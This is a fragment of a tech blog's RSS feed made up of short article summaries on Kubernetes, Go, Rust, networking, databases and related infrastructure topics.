      <description>In the previous article, the RTSP protocol itself was briefly introduced, and this time we will talk about how to implement a simple RTSP server.
Live555 Live555 is a C++ media library that supports a wide range of media services protocols, streaming, receiving and processing audio and video data in a variety of audio and video encoding formats.
It is also one of the few available libraries, and its code is rather cumbersome, but it is simple enough for most people to get started with, so it is perfect for practice and rewriting.</description>

      <description>When we talk about RTSP, it is actually not only the RTSP protocol itself, but we will actually inevitably talk about the following protocols.
 RTP (Real-time Transport Protocol): the protocol really used to transmit audio-video, generally based on the UDP protocol, with special attention to the fact that it uses an even number of ports. RTCP (Real-time Control Protocol): sister protocol to RTP, which provides quality of service (QoS) feedback by periodically sending statistical information, it uses an odd number of ports and is RTP port + 1.</description>

      <description>The biggest difference between using Git, and other version control systems, is that Git is a distributed system, and in each copy of the repository, there is a full amount of code, so conflicts are common in collaboration. Let&amp;rsquo;s look at three Git development models.
git flow git flow is part of the first generation of the git development process. It is divided into two branches, develop and master, where all development is branched on develop and then periodically merged into master.</description>

      <description>The Kubernetes Resource Orchestration Series, starting from the underlying Pod YAML, progressively explains related content, hoping to answer some of your questions about Kubernetes and give users a deeper understanding of cloud-native related technologies.
01 Pod Overall Structure The overall structure of Pod YAML can be initially divided into Resource, Object, Spec and Status. This article will focus on each of these four parts.
 Resource: Defines the type and version of the resource, as a mandatory attribute to get the resource from the Rest API.</description>

      <guid>https://www.sobyte.net/post/2022-07/webpush/</guid>
      <description>At this year&amp;rsquo;s developer conference, Apple announced that Safari will support the WebPush standard. The first support will be for the mac platform, which will be released this fall. Then it will be available for iOS in the first half of next year. By then, all major browsers will support WebPush features. This is a milestone for the Web! The Internet market is now desperately trying to promote mobile applications. One of the main reasons is that the retention rate of Web platform is very low, and the main reason for the low retention rate is the lack of push support.</description>

      <description>There are specific scenarios where we are troubled by the fact that
 the performance of the current development language is still insufficient, such as video processing (in the field of live streaming), machine learning, and games. there are some excellent C/C++ libraries that cannot be reimplemented in the current development language for a while (FFmpeg, OpenCV, Protobuf, ZeroMQ, and a whole lot more).  In general, we will tend to use several ways to solve this.</description>

      <description>Studying the performance of a program is important for every engineer, and I can even say this: It is a necessary skill for an engineer.
Golang&amp;rsquo;s performance analysis tool, pprof, supports the following kinds of analysis.
 heap: a sampling of all living objects in current memory (almost a must for languages with GC), which can be used to analyze memory problems. profile: as opposed to heap, a sampling of the CPU, which can be used to analyze the time-consuming bottleneck of the program.</description>

      <description>As we know, inside the computer, in order to convert binary data to the display, it is necessary to encode, that is, the displayable characters correspond to the binary data one by one, such as ASCII code, which is a Byte of data to represent the English characters plus some English symbols.
As for Chinese, we obviously can not use just one Byte to represent, we need to use a larger space.</description>

      <description>Golang as a static language must be compiled before running, while dynamic languages like Python can be run directly in an interpreter environment, so their best practices for docker deployment will be slightly different.

      <description>Nowadays, Atomic CSS is gaining more and more attention. Compared to the traditional CSS writing method where each component has one CSS class. With Atomic CSS, each CSS class uniquely corresponds to a separate CSS rule. As the number of components grows, more and more CSS rules can be reused. The final CSS product is much smaller, allowing for a quantum leap in page load speed. History of CSS authoring</description>

      <description>The Scanner / Valuer interface provides the ability to convert custom types and database types to each other.
Problems encountered in reality When developing applications, some of the fields in the tables are customized, for example.
1 2  type Day time.Time // Time in days type LocaleTime time.Time // Time of local formatting   Why do I need to redefine these types?
My reason here is to output normalized values when providing the JSON interface downstream.</description>

      <guid>https://www.sobyte.net/post/2022-07/schemahero/</guid>
      <description>SchemaHero is an open source declarative database schema migration cloud-native tool that converts schema definitions into migration scripts that can be applied in any environment. Written as a CLI tool and Kubernetes Operator, SchemaHero eliminates the task of creating and managing sequential migration scripts that are compatible with all environments in which applications are running.
Many database schema management tools create an imperative interface that requires the developer to know the current state of the schema and the relevant commands to migrate the current schema (and associated data) to the new schema.</description>

      <guid>https://www.sobyte.net/post/2022-07/go-plugin-faq/</guid>
      <description>I have encountered a lot of problems in designing and implementing extension development products based on the Go native plug-in mechanism, and since there is very little relevant information in this area, I would like to take this opportunity to make a very rough summary, and hope that it will help you.
This article only say the problem and the solution, do not read the code.

      <title>Implementing bidirectional data exchange between kernel and user states of eBPF programs using Golang</title>
      <link>https://www.sobyte.net/post/2022-07/go-ebpf-03/</link>

      <guid>https://www.sobyte.net/post/2022-07/go-ebpf-03/</guid>
      <description>In the previous two articles, both &amp;ldquo;Developing eBPF programs in C&amp;rdquo; and &amp;ldquo;Developing eBPF programs in Go&amp;rdquo; are hello world level, which may be useful, but not very practical.
Generally speaking, a practical eBPF program has data exchange between its kernel state part and user state part, and with this data exchange, eBPF can play a more powerful role. And to make an eBPF program more practical, eBPF MAP is the mechanism that cannot be bypassed.</description>

      <description>What do you do if you need to get the usage of your host&amp;rsquo;s hard disk, CPU, memory, processes, etc. in Golang? A simple idea would be to run some commands like ps, cd, top through os/exec and then parse the results of those commands.
Of course, based on the Linux idea that everything is a file, a more straightforward approach would be to read the contents of the relevant files, such as those in the /proc directory.</description>

      <description>Summarize this improvement in the following sentence.
 Support for unique constraints and indexing treats null values as identical. Previously, null values were indexed as distinct values. Now you can create constraints that treat null values as identical by using unique nulls not distinct.  Two unique styles Create the example table.

      <description>Obtaining the application&amp;rsquo;s operational metrics gives us a better understanding of its actual status. By connecting these metrics to monitoring systems such as prometheus, zabbix, etc., the application can be continuously checked and any abnormalities can be alerted and handled in a timely manner.
Pull and Push There are two ways to interface with monitoring systems, one is Pull and the other is Push.
In the case of Prometheus, for example, the application exposes an HTTP interface for Prometheus to periodically grab metrics through, which is called Pull, while Push is when the application actively pushes metrics to PushGateway.</description>

      <description>serde is pretty much the most commonly used serialization and deserialization library in the Rust ecosystem today.
Golang Implementation As a Golang programmer, it&amp;rsquo;s important to compare.
The official Golang library directly implements serialization and deserialization of json.
For both serialization and deserialization, Go uses a simple interface called interface.

      <description>The first time I got to know VXLAN was when I looked at a network plugin called flannel used in k8s that has a VXLAN mode, which implements an Overlay Network that connects all containers together. So in this article, let&amp;rsquo;s take a look at how VXLAN connects the networks between different containers.
Overview Before we look at VXLAN, let&amp;rsquo;s take a look at its predecessor, VLAN, whose full name is Virtual Local Area Network, a layer 2 (data link layer) network used to partition broadcast domains.</description>

      <guid>https://www.sobyte.net/post/2022-07/k8s-high-component-availability/</guid>
      <description>In Kubernetes, components such as Controller Manager, Scheduler, and user-implemented Controllers are highly available by means of multiple replicas. However, multiple replica Controllers working at the same time inevitably trigger a contention condition for the resources they are listening to, so usually only one replica is working between multiple replicas.
In order to avoid this competition, Kubernetes provides a Leader election model, where multiple replicas compete with each other for the Leader, and only the Leader will work, otherwise it will wait.</description>

      <description>The following is a standard explanation of containerization. A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another. A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.

Borg was released in 2003, from a small project to an internal cluster management system that supports thousands of applications and tasks within Google, its success speaks for itself.
In 2014, Google released Kubernetes as an open-source version of Borg, which was exciting, and then Microsoft, IBM, and RedHat joined the Kubernetes community to add to it.</description>

      <description>Users expect applications to be available all the time, and developers need to deploy new versions of them multiple times a day. In Kubernetes, this is accomplished with Rolling Updates. Rolling updates allow Pod instances to be updated incrementally by using new instances. Deployment updates are performed with zero downtime.
Kubernetes Rolling Update Basic Concepts Concepts When a service in a cluster needs to be updated, the traditional approach is to take the service to be updated offline, update the version and configuration after the business is stopped, and then restart and provision the service.</description>

      <description>Kubernetes is a completely resource-centric container orchestration platform, which is evident from the design of the REST API exposed by kube-apiserver, and the ecosystem of Kubernetes revolves around the control and maintenance of many component resources, so it can be considered as a &amp;ldquo;resource control system&amp;rdquo; in essence.
Group / Version / Resource For the concept of resource, if in a large and complex container orchestration platform designed only such a simple &amp;ldquo;resource&amp;rdquo; semantics is obviously a bit thin, or expression is too weak, so for such a concept of resources, in Kubernetes and grouped and versioned words, so there are some terms we usually see in operations and development: Group / Version / Resource / Kind, respectively: Resource Group / Resource Version / Resource / Resource Type.</description>

      <description>kube-proxy operational mechanism To support horizontal scaling and high availability of clusters, Kubernetes abstracts the concept of a Service, which is an abstraction of a set of Pods that are accessed according to an access policy (e.g., load balancing policy). Kubernetes assigns a virtual IP address to the Service when it is created, and clients access the Service by accessing the virtual Clients access the service by accessing the virtual IP address, and the service is responsible for forwarding requests to the back-end Pods.</description>

For Docker network, its biggest limitation is the gap in the cross-host container communication scheme, while Kubernetes, as a container orchestration platform suitable for large-scale distributed clusters, mainly solves the following problems at the network implementation level.
 inter-container communication. Pod-to-Pod communication. Pod-to-Service communication. Intra-cluster and inter-cluster communication.  This blog post focuses on Kubernetes inter-container communication and inter-Pod communication, followed by a separate article on Pod-Service communication, which is related to kube-proxy working principle and service mechanism.</description>

      <description>When you are developing and maintaining Kubernetes, the most common concepts you come across are the networking concepts of Docker and Kubernetes. Especially for Kubernetes, there are various IPs, ports, and sometimes confusion. Therefore, it is necessary to learn the underlying network implementation of Docker and Kubernetes. In this article, we will first analyze and introduce the network implementation of Docker.
Docker Networking Basics Docker&amp;rsquo;s networking implementation mainly makes use of Linux networking related technologies such as Network Namespace, Veth device pairs, bridges, iptables, routing.</description>

      <description>The Linux network stack is very efficient and at the same time complex. If we want to do something with the data we care about during the processing of the data, how can we do it?Linux provides a mechanism to implement custom packet processing for the user.
There is a set of callback function hooks in the Linux network stack, through which hooks can be attached to the Linux network stack to perform some operations on the packet during processing, such as filtering, modifying, dropping, etc.</description>

      <description>client-go is the programmatic interactive client library used by the Kubernetes project. The core source code related to resource interaction is separated out as a project, client-go. That is to say, the Kubernetes used now is integrated with client-go, so the coding quality of this library should be assured.
client-go is a programmatic interactive client library that allows you to add, delete, modify, and query resource objects in a kubernetes cluster by writing Go code.</description>

      <description>Exploration of the definition of cloud-native The concept of &amp;ldquo;cloud native&amp;rdquo; is mentioned, but how many people really understand this concept? Whenever I browse some communities (not least some professional technical communities) and see some friends discussing cloud-native related topics, I sometimes feel that there is still a little bit of a problem with their understanding of cloud-native.
Many people directly think that applications deployed in the cloud are called cloud-native applications.</description>

      <description>The basic process of flowing traffic through a host  Inbound traffic passes through the NIC and enters the host&amp;rsquo;s network stack. the protocol stack checks the messages against pre-customized network rules (iptables/netfilter). after the stack rules check, compliant Inbound traffic enters from kernel space to user space and enters the process that specifies the listening port. the user process in the user state receives the network traffic message for processing and returns the processed result to the network protocol stack in kernel space via user space.</description>

      <description>Service Mesh and Sidecar Concepts Before understanding the injection mechanism of Sidecar, it&amp;rsquo;s important to clarify the what and why questions.
First, what is a Service Mesh?
Service Mesh, or translated as &amp;ldquo;Service Mesh&amp;rdquo;, is a configurable low-latency infrastructure layer designed to handle a large amount of network-based inter-process communication between application services through APIs (Application Programming Interfaces). The Service Grid ensures fast, reliable and secure communication between infrastructure services of containerized transient presence applications.</description>

      <description>In Golang programming, when it comes to concurrency problems, there are usually two solutions. Adopt the shared memory model and use sync.Mutex / sync.RWMutex etc. to add locks and set critical zones to solve the data concurrent access problem. Adopt the message communication model and use channel for inter-goroutine communication to avoid memory sharing to solve the problem. The official recommendation is to use the second option, so what is</description>

      <description>I recently researched the permission model, and after reading AWS IAM, I feel that AWS IAM is very well designed. In my personal opinion, RBAC is still not enough for some scenarios, mainly because the control granularity is not enough. For example, I want to control a role can only operate the resources of a certain cluster, RBAC can not express, but ABAC can express, but ABAC is much more complex, AWS IAM is ABAC, but ease of use is very good.</description>

      <description>When writing tests, we all need to start external services such as Redis or Postgres, and we need to initialize the database connection before starting the test, or prepare the test data, and close the database connection after the test is finished, and remove unnecessary test data or files. In Golang, developers don&amp;rsquo;t need to rely on third-party packages, they can do this very easily with the built-in TestMain. Here&amp;rsquo;s how to do it and how to use it.</description>

      <description>kube-apiserver is the gateway component of kubernetes and is the only entry point for kubernetes cluster resource operations, so some processes such as authentication and authorization are obviously implemented based on this component. kubernetes clusters basically perform all operations through the apiserver component, which provides an API in the form of HTTP RESTful for clients inside and outside the cluster to call. kubernetes provides three steps of security for accessing the API: authentication, authorization, and admission control, which are verified when users request apiserver using kubectl, client-go, or the REST API.</description>

      <description>The three most important components of the kubernetes master node are kube-apiserver, kube-controller-manager, and kube-scheduler, which are responsible for resource access portal, cluster state management, and resource scheduling of the kubernetes cluster respectively.
This article focuses on the kube-controller-manager component and analyzes how it and its core component informer effectively manage cluster state.
Overview of how Controller Manager &amp;amp; Controller works We all know that managing resources in kubernetes is relatively simple, usually by writing a YAML manifest, which can be solved directly with the kubectl command.</description>

      <description>CNI, whose full name is Container Network Interface, is the API interface for container networks. The direction of kubernetes networking is to integrate different networking solutions by way of plugins, and CNI is the result of this effort. CNI focuses only on solving container network connectivity and resource release when containers are destroyed, providing a set of frameworks so that CNI can support a large number of different networking models and is easy to implement.</description>

      <description>.NET 7 has a built-in Rate Limiting feature, which limits the number of requests that can access a resource. For example, a database can safely handle 1000 requests per minute, and it&amp;rsquo;s not sure if more will crash. This is where you can put a rate limiter in your application that only allows 1000 requests per minute and starts rejecting requests after that number is reached. This is a way to protect resources and prevent the application from crashing in case of high browsing.</description>

      <description>This article introduces some basic concepts of ESLint, and how to configure ESLint in webpack and vscode.
Why do I need ESLint? JavaScript is different from other languages in that it does not have a pre-compilation checking process. If there is an error in your code, the error will only be exposed after the program is run. This exposure of errors greatly affects the efficiency of development. On the other hand, because JavaScript is a dynamic language, if a team is developing without following a certain specification to write code, everyone adds code according to their own style.</description>

      <description>This article describes how to create a virtual bridge in centos8 using the nmcli tool and add a physical NIC to the virtual bridge to make it a Layer 2 switch.
This operation is not only applicable to physical NIC devices, but also to virtual NIC devices of various virtual machines.
The goal is to combine all three NICs in the red box into a Layer 2 switch. First we need to create a bridge device, which is the functional equivalent of the switch we normally use.</description>

      <description>Kubernetes, a Greek word meaning &amp;ldquo;helmsman&amp;rdquo; or &amp;ldquo;pilot,&amp;rdquo; is a portable, scalable open source platform that uses declarative configuration to manage orchestration of container services and increase the level of automation and efficiency. At the same time, k8s is supported by a large and still growing ecosystem of available peripheral services, tools and ecological support.
The definition given on the official kubernetes website is as follows.
 Kubernetes, also known as K8s, is an open-source system for automating deployment, scaling, and management of containerized applications.</description>

      <description>I remember reading a report the other day that Kubernetes for internal use in private deployments was delayed by 17 months compared to the community version. So, in many companies, installing an older version of Kubernetes may be a routine operation.
However, not only does Kubernetes have versioning issues, but its installation tool, kubeadm, also has versioning requirements, so in order to install a specific version of Kubernetes, you have to install a specific version of kubeadm.</description>

      <description>cargo new generates the beginnings of a project, providing the src/main.rs and src/lib.rs files, but as the project grows, the amount of code becomes larger, and it is not appropriate to maintain a large amount of code in one file. This is when files are usually split by &amp;ldquo;modules&amp;rdquo;, and rust is no exception.
Here we learn how the code is organized in rust, mainly involving the following concepts.
 package: a concept in Cargo that manages crate crate: a collection of modules, compilation units, both lib and bin, that is, for others to call, or an executable file module: used to organize code within crate workspace: when the project is complex, manage multiple packages  package The cargo new command creates a new project, also a package, with a cargo.</description>

      <description>I recently wrote another Mutating Webhook for K8s and read the official documentation. Some special points to remember are summarized below. Although it is mainly for Mutating type webhooks, it should work for Validating type webhooks as well.
Versioning One of the most troublesome things about programming in K8s is the issue of versioning and the resulting dependencies on go mod. So the first thing you need to do before writing code, and before referring to other people&amp;rsquo;s code, is to check which API versions you need to support and use.</description>

      <description>Continuous Archival Backups pg has three basic backup methods.
 sql dump using pg_dump, which is a logical backup that cannot be restored to a specified state. File system based backup, requires file system to provide snapshot function to ensure consistency, otherwise must be shut down first and then backed up. Continuous archiving, the preferred high-reliability backup technology.  Continuous archiving of WAL logs is the key to implementing archived backups, combining a file system level backup with an archived WAL file, so that when recovery is required, the file system backup is restored first, and then the archived WAL file is replayed to restore the system to its current (or specified point in time) state.</description>

I&amp;rsquo;ve tried it briefly, and I guess it&amp;rsquo;s probably like this.
The following code.
1 2 3 4 5 6 7 8 9 10 11  asyncfn say_world(){println!(&amp;#34;hello world&amp;#34;);}#[tokio::main]asyncfn main(){letop=say_world();op.await;}  Using nightly&amp;rsquo;s rustc &amp;ldquo;compile&amp;rdquo;.

      <description>No one who uses K8s will be unaware of CNI, but probably most people, most of the time, only care about the installation. Put the binary in /opt/cni/bin, create the configuration file under /etc/cni/net.d/, and leave the rest to K8s or containerd, we don&amp;rsquo;t care and don&amp;rsquo;t understand the implementation.
CNI, known as Container Network Interface, is a specification used to define container networks. containerernetworking/cni is a CNCF CNI implementation project, including basic bridge, macvlan and other basic network plugins.</description>

      <guid>https://www.sobyte.net/post/2022-07/rust-string/</guid>
      <description>There are two types of strings in Rust, String and &amp;amp;str, where String can be dynamically allocated, modified, and the internal implementation can be understood as Vec&amp;lt;u8&amp;gt;, and &amp;amp;str is a slice of type &amp;amp;[u8]. Both of these strings can only hold legal UTF-8 characters.
For non-naturally recognizable UTF-8 characters, consider using the following types.
 File paths have dedicated Path and PathBuf classes available. Use Vec&amp;lt;u8&amp;gt; and &amp;amp;[u8] Use OSString and &amp;amp;OSStr to interact with the operating system Use CString and &amp;amp;CStr to interact with C libraries  The second method above is the common way to handle non-UTF-8 byte streams, which is to use Vec&amp;lt;u8&amp;gt; and &amp;amp;[u8], where we can also use literal values for both types of data, which we call byte string literals of type &amp;amp;[u8].</description>

      <description>Process eviction: When there is resource pressure on a machine, it may be due to a malicious program that is consuming system resources, or due to overcommit. The system reduces the overall impact of a single program on the system by controlling the survival of processes on the machine. The most critical aspect of the eviction phase is to select the right process to ensure system stability by minimizing the cost.</description>

      <description>In a distributed system, if Service A has to invoke Service B and multiple instances of both services are deployed, the problem of load balancing has to be solved. That is, we want the QPS reaching B to be balanced across all instances of B.
In previous HTTP/1.1-like implementations, Service A needs to establish a TCP connection with B for each request. So the load balancing implementation is generally based on the number of connections.</description>

      <description>We know that Prometheus uses the pull mode, but in some network scenarios (such as not on a subnet or firewall), Prometheus cannot directly pull the monitoring metrics data, so we may need a mode that can actively push. Pushgateway is one of the tools in the Prometheus ecosystem to solve this problem. However, Pushgateway is not a panacea and has some drawbacks.

      <description>Recently, we found that many instances on our network are in Evicted state. Through pod yaml, we can see that the instances are being evicted because of insufficient node resources. However, these instances are not automatically cleaned up, and most users of the platform will think that there is a problem with the service or the platform when they see Evicted instances under the service, which affects the user experience. The Pods in the Evicted state have been destroyed in the underlying container, which has no impact on the user&amp;rsquo;s service.</description>

      <description>Descheduler component introduction When an instance is created, the scheduler can select the best node for scheduling based on the cluster state at that time, but the resource usage within the cluster is dynamically changing, and the cluster will become unbalanced over time, requiring the Descheduler to migrate the pods already running on the node to other nodes to achieve a more balanced distribution of resources within the cluster. There are several reasons why we want to migrate the instances running on a node to other nodes.</description>

      <description>I recently learned about OIDC in the authentication system and put together a blog that covers the concepts, processes, and usage of OIDC. Before introducing these, we need to clarify two terms Authorization and Authentication.
Authorization vs Authentication Here is OKTA&amp;rsquo;s definition of the two terms.
 Authentication, in the form of a key. The lock on the door only grants access to someone with the correct key in much the same way that a system only grants access to users who have the correct credentials.</description>

      <description>Introduction Circuit breaker mode, analogous to the circuit breaker mechanism in real circuits. When the line voltage is too high, the fuse will be broken, and the power can be restored after successful repair. Distributed scenarios also face service exceptions and network timeouts, which require a certain amount of time to recover. If the retry request is kept, it will return failure and take up resources during the unrecovered time. So the design core of the circuit breaker pattern is needed to &amp;ldquo;prevent infinite retries of a known failed operation&amp;rdquo; .</description>

      <description>DNS DNS (Domain Name System) is a global distributed database for storing the mapping relationship between domain names and Internet IP addresses.
DNS is divided into two main categories: authoritative DNS, and recursive DNS.
Authoritative DNS Authoritative DNS is a DNS server set up at the domain name registrar for a specific domain name record, and is used for the management of the specific domain name itself. It only resolves domain names that it owns, and denies access to domains that are not its own.</description>

      <description>In many systems, to decouple, or to handle tasks that take a long time (for example, some network requests may be slow, or some requests are CPU-intensive and need to wait for a while), we usually introduce task queues. A typical task queue consists of the following three parts.
 The first part is the producer, there are two common ones, one is triggered by the user, for example, in web applications, the user needs to send a request to the mail provider when verifying the mailbox; the other one is triggered by the machine, for example, the timing task, I generally call it scheduler.</description>

Our kube-apiserver is configured with OIDC authentication and the OIDC issuer is added with dns server records, but for some reason I need to override the dns server resolution and use the hostAlias IP address instead, but the actual test found that it always took DNS resolution, although the /etc/hosts file file has been added with custom hosts records. The domain names that are not registered with the dns server can still be resolved by /etc/hosts.</description>

      <description>kubernetes supports local volume (local volume) since version 1.10. workloads (not only statefulsets types) can take advantage of local fast SSDs to get better performance than remote volumes (e.g. cephfs, RBD).
Before the advent of local volume, statefulsets could also take advantage of local SSDs by configuring hostPath and binding to specific nodes via nodeSelector or nodeAffinity. However, the problem with hostPath is that administrators need to manually manage the directory of each node of the cluster, which is less convenient.</description>

      <description>What is PodSecurityPolicy PodSecurityPolicy is a global resource used to control Pod security-related configuration.
On a kubernetes cluster with RBAC enabled, if users are allowed to use kubectl, then PodSecurityPolicy must be enabled, otherwise users may use some privileged resources (e.g. privileged, hostNetwork, hostPath, etc.) and affect the stability of the node machine.
With PSP turned on, users can only use resources allowed by the administrator. PSP supports the following (see official website for details).</description>

Relationship between AOP and IOC AOP (Aspect Oriented Programming) is a programming design idea that aims to reduce the coupling between business logics by intercepting business process tangents and implementing specific modularization capabilities. This idea has been practiced in many well-known projects. For example, Spring&amp;rsquo;s PointCut, gRPC&amp;rsquo;s Interceptor, and Dubbo&amp;rsquo;s Filter. aOP is just a concept that has been applied in different scenarios, resulting in different implementations.
Let&amp;rsquo;s start by discussing more specific RPC scenarios, using gRPC as an example.</description>

      <description>GitOps was first introduced by Weaveworks, a Kubernetes management company, in 2017. Now that five years have passed, I&amp;rsquo;m sure you&amp;rsquo;ve heard of the concept, but you may not know what it is or what it has to do with DevOps. In this article, we&amp;rsquo;ll help you figure it out one by one.
Infrastructure as Code Before we can understand GitOps, we need to understand what Infrastructure as Code is.</description>

      <guid>https://www.sobyte.net/post/2022-07/k8s-pvc-resize/</guid>
      <description>Since v1.11, kubernetes has enabled the resize feature and PersistentVolumeClaimResize admission controller by default, so that if the storage volume created by the user is not large enough, it can be expanded without losing the original data. Currently supported storage volumes for resize are AWS-EBS, GCE-PD, Azure Disk, Azure File, Glusterfs, Cinder, Portworx, and Ceph RBD.
 Block file systems such as GCE-PD, AWS-EBS, Azure Disk, Cinder, and Ceph RBD require file system expansion.</description>

      <guid>https://www.sobyte.net/post/2022-07/k8s-limit-local-temporary-storage/</guid>
      <description>Introduction As a provider of the kubernetes platform, it is important to put some restrictions on certain &amp;ldquo;rogue&amp;rdquo; applications to prevent them from abusing the platform&amp;rsquo;s CPU, memory, disk, network, and other resources.
For example, kubernetes provides limits on CPU and memory to prevent applications from using system resources without limits; kubernetes provides PVCs, such as cephfs and RBD, which also support capacity limits.
However, earlier versions of kubernetes did not limit the capacity of the container&amp;rsquo;s rootfs.</description>

      <description>Background Recently, while running maintenance, I discovered that network devices (such as switches) have a feature to send logs remotely, i.e. they can send logs to a specified server via the syslog udp protocol. To do this, you can run rsyslog on the server and collect the logs.
rsyslog configuration The default rsyslog configuration collects the system local configuration, so we need to write an rsyslog configuration for collecting remote logs.</description>

      <description>This article describes how to configure easy A/B testing in Nginx.
Background Prerequisites Sometimes we need to do simple A/B tests that don&amp;rsquo;t require complex conditions, so we can use Nginx&amp;rsquo;s ngx_http_split_clients_module module.
Install the ngx_http_split_clients_module module Generally this module already comes with it, if not it is recommended to install our packaged N.WTF
Configuring Nginx For example, we want 20% of our users to be forwarded to the URL https://example.</description>

      <description>Cond in Golang&amp;rsquo;s sync package implements a conditional variable that can be used in scenarios where multiple Readers are waiting for a shared resource ready (if there is only one read and one write, a lock or channel takes care of it).
Cond pooling point: multiple goroutines waiting, 1 goroutine notification event occurs.
Each Cond is associated with a Lock (*sync.Mutex or *sync.RWMutex), which must be added when modifying conditions or calling Wait methods, protecting the condition.</description>

For some reason, the web service is a hostNetwork type, which is the same network namespace as the host, and when I logged into Node, I could see that the listening socket was still there, but when I made a direct curl request, it returned Connection Refused.
Why? Usually Connection Refused means that the listening socket is not open and the corresponding port number is not opened, the kernel will return icmp-port-unreachable, but now it is obvious that the port is open.</description>

      <title>How to access Kubernetes Pods from outside the cluster</title>

      <guid>https://www.sobyte.net/post/2022-06/k8s-access-pods/</guid>
      <description>A pod running on a kubernetes cluster is easy to access from within the cluster, most simply, through the pod&amp;rsquo;s ip, or through the corresponding svc. However, outside the cluster, the pod ip of the flannel-based kubernetes cluster is not accessible from outside the cluster because it is an internal address.
To solve this problem, kubernetes provides several methods as follows.
hostNetwork: true When hostNetwork is true, the container will use the network of the host node, so the container&amp;rsquo;s services can be accessed from outside the cluster as node-ip + port, as long as you know which node the container is running on.</description>

      <description>Requirements Overview Previously, some services hosted on Kubernetes at home, such as portal, emby, weave scope, etc., were accessed using service ip, which was slightly troublesome to access, mainly because the ip had to be remembered.
Kubernetes provides Ingress to solve the problem of load balancer type service (vip consumption, L7 load feature, etc.).
For this requirement, you can set up pan domain on godaddy with type A, for example *.</description>

      <description>Overview In Kubernetes, kube-controller-manager, kube-scheduler, and the underlying implementation of controller-rumtime using Operator all support leader election in highly available systems. This article will focus on understanding how the leader election in controller-rumtime (the underlying implementation is client-go) is implemented in the kubernetes controller. Background When running kube-controller-manager, there are some parameters provided to cm for leader election, you can refer to the official documentation parameters to understand the parameters.</description>

      <description>Background When we add business logs to our application code, regardless of the level of logging, in addition to the information that we actively pass to Logger for it to log, it is also very important to know which function printed the line and where it is located, otherwise it is likely to be like looking for a needle in a haystack when troubleshooting.
For logging, it is important to record the function name and line number of the caller of the Logger method.</description>

      <description>Inspired by PromQL, Loki also has its own query language, called LogQL, which is like a distributed grep that aggregates views of logs. Like PromQL, LogQL is filtered using tags and operators, and has two main types of query functions.
 Query to return log line contents Calculating relevant metrics in the log stream by filtering rules  Log queries A basic log query consists of two parts.
 log stream selector log pipeline  Due to the design of Loki, all LogQL queries must contain a Log Stream selector.</description>

      <description>Problem description When containerizing nginx, there is a common problem: How do I automatically set the number of nginx worker processes?
In the nginx.conf configuration file of the official nginx container image, there is a worker process configuration.
1  worker_processes 1;   It will configure nginx to start only 1 worker. this works well when the nginx container is 1 core.
When we want nginx to give a higher configuration, for example 4c or 16c, we need to make sure that nginx can also start the corresponding number of worker processes.</description>

      <description>When using a image repository in an enterprise, you usually need to enable authentication, and the authentication credentials may be a common account for users in the enterprise. However, after docker login, the username and password after base64 will be saved in .docker/config.json, so that on some servers used by many people, there will be a problem of account leakage.
Is there a solution for this?
docker provides credentials store, which means that passwords are stored in an external credentials store.</description>

      <description>Display Manager (DM) is a program that provides graphical login capabilities for Linux distributions. It controls user sessions and manages user authentication. Display Manager will start the display server and load the desktop environment as soon as you enter your username and password.
The display manager is usually synonymous with the login screen. It is, after all, the visible part. However, the visible login screen, also called the welcome page (greeter), is only part of the display manager.</description>

      <description>1. Preface In our recent work, we found that some nodes in the K8s cluster had high resource usage and some nodes had low resource usage. We tried to redeploy the application and evict the Pod, but found that it did not effectively solve the load imbalance problem. After learning the Kubernetes scheduling principle, we retooled the Request configuration and introduced the scheduling plugin to finally solve the problem. This</description>

      <description>1. Overview Namespace is an important concept in kubernetes, an abstraction of a set of resources and objects, often used to isolate different users. namespace has many resources under it, such as our common deployment, pods, service, ingress, configmap, and so on.
Of course, the focus of this article is on what happens when namespace is deleted. A typical scenario is when executing kubectl delete ns test in the terminal, we will observe that after executing the command, the test namespace will immediately enter the terminating state, and will only be actually deleted after a few seconds.</description>

      <description>1. Overview A running kubernetes cluster stores a lot of interrelated resources, such as deployment, replicaset and pod, which are a set of related resources that we commonly use. When we create a deployment, the relevant controller automatically creates the replicaset, and then the controller of the replicaset creates the pod to run the service we deployed. This mechanism is called garbage collection (hereinafter referred to as GC). In earlier</description>

      <description>Log collection with multi-line logs is always a headache, developers are not willing to output logs as JSON, so they have to re-structure the logs when collecting them.
Since log collectors are implemented in different ways and standards, how to handle multi-line logs will be different for different collectors. For example, if we use Fluentd as our log collector, we can use the multiline parser to handle multi-line logs.
The multiline parser uses the formatN and format_firstline parameters to parse the logs.</description>

      <description>Processes are a very familiar concept, and we have probably heard of process context switching overhead. So let&amp;rsquo;s think about a question today, just how much CPU time is consumed by a process context switch? As threads are said to be lighter than processes, will their context switches save much CPU time than process switches? With these questions in mind, let&amp;rsquo;s get to the point.
1. Processes and process switching Processes are one of the great inventions of operating systems, shielding applications from hardware details such as CPU scheduling and memory management, and abstracting the concept of a process so that applications can concentrate on implementing their own business logic and perform many tasks &amp;ldquo;simultaneously&amp;rdquo; on a limited CPU.</description>

      <description>1. Overview There are two types of users in kubernetes: service account and regular user. These two user types correspond to two usage scenarios.
The service account is provided to the pods running in the cluster, and when these pods want to communicate with the apiserver, it is the serviceaccount that is used for authentication and authorization. Service accounts are stored in the k8s cluster and are RBAC-based and can be bound to roles to have specific permissions for specific resources.</description>

      <description>The company had multiple go-redis clients and multiple versions of the redis cluster. When conducting a business stress test, we found that even if we only access the redis interface, the latency can be as high as a second, which is very counterintuitive. We use different versions of go-redis and different versions of redis cluster to do a simple stress test. redis commands are simple get, kv size is one</description>

      <title>The Complete Guide to Migrating Storage Across StorageClass in Kubernetes</title>
      <link>https://www.sobyte.net/post/2022-06/k8s-migrating/</link>

      <guid>https://www.sobyte.net/post/2022-06/k8s-migrating/</guid>
      <description>Thinking Let&amp;rsquo;s first think about what few things need to be done to switch StorageClass. First you need to reduce the number of copies of the application to 0, then create a new PVC, copy the data from the old PV to the new PV, then let the application use the new PV and expand the copies to the original number, and finally delete the old PV. This whole process also prevents Kubernetes from deleting the PV when the PVC is deleted.</description>

      <guid>https://www.sobyte.net/post/2022-06/wishbone/</guid>
      <description>Background I have recently been studying how to introduce the Wishbone bus protocol into my Principles of Computer Composition course, so I took the opportunity to learn about the Wishbone protocol.
